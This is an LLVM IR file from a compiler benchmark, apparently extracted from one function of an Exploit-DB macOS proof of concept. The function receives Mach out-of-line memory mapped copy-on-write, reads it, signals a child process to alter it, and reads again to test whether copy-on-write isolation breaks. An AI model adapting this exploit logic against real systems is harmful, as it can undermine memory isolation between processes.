; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_46296.c_do_parent.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_46296.c_do_parent.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ool_rcv_msg = type { %struct.TYPE_6__, %struct.TYPE_4__, i32 }
%struct.TYPE_6__ = type { i32, i8*, i8* }
%struct.TYPE_4__ = type { i32*, i32 }
%struct.ping_send_msg = type { %struct.TYPE_5__, i32 }
%struct.TYPE_5__ = type { i32, i32, i8* }
%struct.ping_rcv_msg = type { %struct.TYPE_6__, i32 }

@.str = private unnamed_addr constant [35 x i8] c"parent receiving child OOL message\00", align 1
@.str.1 = private unnamed_addr constant [66 x i8] c"[+] parent got an OOL descriptor for %x bytes, mapped COW at: %p\0A\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"[+] parent reads: %08x\0A\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"telling child to try to change what I see!\00", align 1
@MACH_MSG_TYPE_COPY_SEND = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [29 x i8] c"parent sending ping to child\00", align 1
@.str.5 = private unnamed_addr constant [42 x i8] c"parent receiving ping to try another read\00", align 1
@.str.6 = private unnamed_addr constant [62 x i8] c"parent got ping message from child, lets try to read again...\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @do_parent(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca %struct.ool_rcv_msg, align 8
  %5 = alloca i32*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.ping_send_msg, align 8
  %9 = alloca %struct.ping_rcv_msg, align 8
  store i8* %0, i8** %2, align 8
  %10 = bitcast %struct.ool_rcv_msg* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = load i8*, i8** %2, align 8
  %12 = getelementptr inbounds %struct.ool_rcv_msg, %struct.ool_rcv_msg* %4, i32 0, i32 0
  %13 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %12, i32 0, i32 1
  store i8* %11, i8** %13, align 8
  %14 = getelementptr inbounds %struct.ool_rcv_msg, %struct.ool_rcv_msg* %4, i32 0, i32 0
  %15 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %14, i32 0, i32 0
  store i32 48, i32* %15, align 8
  %16 = getelementptr inbounds %struct.ool_rcv_msg, %struct.ool_rcv_msg* %4, i32 0, i32 0
  %17 = call i32 @mach_msg_receive(%struct.TYPE_6__* %16)
  store i32 %17, i32* %3, align 4
  %18 = load i32, i32* %3, align 4
  %19 = call i32 @MACH_ERR(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i32 %18)
  %20 = getelementptr inbounds %struct.ool_rcv_msg, %struct.ool_rcv_msg* %4, i32 0, i32 1
  %21 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %20, i32 0, i32 0
  %22 = load i32*, i32** %21, align 8
  store i32* %22, i32** %5, align 8
  %23 = getelementptr inbounds %struct.ool_rcv_msg, %struct.ool_rcv_msg* %4, i32 0, i32 1
  %24 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %23, i32 0, i32 1
  %25 = load i32, i32* %24, align 8
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %6, align 4
  %27 = load i32*, i32** %5, align 8
  %28 = bitcast i32* %27 to i8*
  %29 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.1, i64 0, i64 0), i32 %26, i8* %28)
  %30 = load i32*, i32** %5, align 8
  %31 = load volatile i32, i32* %30, align 4
  %32 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i32 %31)
  %33 = call i32 @LOG(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0))
  %34 = getelementptr inbounds %struct.ool_rcv_msg, %struct.ool_rcv_msg* %4, i32 0, i32 0
  %35 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %34, i32 0, i32 2
  %36 = load i8*, i8** %35, align 8
  store i8* %36, i8** %7, align 8
  %37 = bitcast %struct.ping_send_msg* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %37, i8 0, i64 24, i1 false)
  %38 = getelementptr inbounds %struct.ping_send_msg, %struct.ping_send_msg* %8, i32 0, i32 0
  %39 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %38, i32 0, i32 0
  store i32 24, i32* %39, align 8
  %40 = load i8*, i8** %7, align 8
  %41 = getelementptr inbounds %struct.ping_send_msg, %struct.ping_send_msg* %8, i32 0, i32 0
  %42 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %41, i32 0, i32 2
  store i8* %40, i8** %42, align 8
  %43 = load i32, i32* @MACH_MSG_TYPE_COPY_SEND, align 4
  %44 = call i32 @MACH_MSGH_BITS(i32 %43, i32 0)
  %45 = getelementptr inbounds %struct.ping_send_msg, %struct.ping_send_msg* %8, i32 0, i32 0
  %46 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %45, i32 0, i32 1
  store i32 %44, i32* %46, align 4
  %47 = getelementptr inbounds %struct.ping_send_msg, %struct.ping_send_msg* %8, i32 0, i32 0
  %48 = call i32 @mach_msg_send(%struct.TYPE_5__* %47)
  store i32 %48, i32* %3, align 4
  %49 = load i32, i32* %3, align 4
  %50 = call i32 @MACH_ERR(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0), i32 %49)
  %51 = bitcast %struct.ping_rcv_msg* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %51, i8 0, i64 32, i1 false)
  %52 = getelementptr inbounds %struct.ping_rcv_msg, %struct.ping_rcv_msg* %9, i32 0, i32 0
  %53 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %52, i32 0, i32 0
  store i32 32, i32* %53, align 8
  %54 = load i8*, i8** %2, align 8
  %55 = getelementptr inbounds %struct.ping_rcv_msg, %struct.ping_rcv_msg* %9, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %55, i32 0, i32 1
  store i8* %54, i8** %56, align 8
  %57 = getelementptr inbounds %struct.ping_rcv_msg, %struct.ping_rcv_msg* %9, i32 0, i32 0
  %58 = call i32 @mach_msg_receive(%struct.TYPE_6__* %57)
  store i32 %58, i32* %3, align 4
  %59 = load i32, i32* %3, align 4
  %60 = call i32 @MACH_ERR(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.5, i64 0, i64 0), i32 %59)
  %61 = call i32 @LOG(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.6, i64 0, i64 0))
  %62 = load i32*, i32** %5, align 8
  %63 = load volatile i32, i32* %62, align 4
  %64 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i32 %63)
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @mach_msg_receive(%struct.TYPE_6__*) #2

declare dso_local i32 @MACH_ERR(i8*, i32) #2

declare dso_local i32 @printf(i8*, i32, ...) #2

declare dso_local i32 @LOG(i8*) #2

declare dso_local i32 @MACH_MSGH_BITS(i32, i32) #2

declare dso_local i32 @mach_msg_send(%struct.TYPE_5__*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
